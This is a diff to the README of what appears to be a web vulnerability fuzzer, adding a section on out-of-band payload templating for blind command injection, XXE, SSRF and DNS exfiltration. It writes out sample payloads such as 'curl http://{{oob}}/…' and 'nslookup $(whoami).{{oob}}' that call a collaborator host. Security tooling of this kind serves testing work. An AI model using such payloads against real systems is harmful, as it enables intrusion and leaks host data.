@@ -30,6 +30,14 @@ stateful login forms. `--jsonl` emits one JSON object per hit to stdout (silent
 otherwise; summary to stderr) — pipes into jq or the single-target spider loop
 (`06-crawler`): spider maps a target's endpoints → fuzz each → JSONL findings.
 
+**OOB templating:** payloads needing a call-back (blind CMDi, OOB XXE, SSRF, DNS
+exfil) carry the placeholder `{{oob}}` — a **bare host**, so the payload writes
+its own scheme (`curl http://{{oob}}/…`, `nslookup $(whoami).{{oob}}`). Supply
+the collaborator with `--oob-url <url-or-host>` (accepts the `{{interactsh-url}}`
+alias); it's substituted at injection time. Without it, OOB payloads are skipped
+(reported to stderr), not sent as dead probes. See the heavy note above
+`substitute_oob` in `agent.rs` for why `{{oob}}` is a host, not a URL.
+
 `tests/calibration.rs` is a deterministic regression guard: it runs every
 `targets.toml` target through the loop at fixed seeds and asserts each clears a
 per-target hit-rate floor (and that `waf-blocked` stays at 0). It catches
